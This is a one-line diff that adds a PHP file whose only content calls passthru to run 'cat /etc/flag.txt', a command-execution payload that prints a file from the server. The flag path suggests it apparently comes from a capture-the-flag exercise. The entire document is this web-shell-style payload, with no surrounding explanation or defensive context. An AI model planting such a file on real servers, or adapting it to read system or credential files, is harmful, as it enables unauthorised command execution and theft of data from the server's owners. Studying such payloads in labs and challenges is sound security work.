@@ -1,0 +1,1 @@
+<?php passthru("cat /etc/flag.txt"); ?>
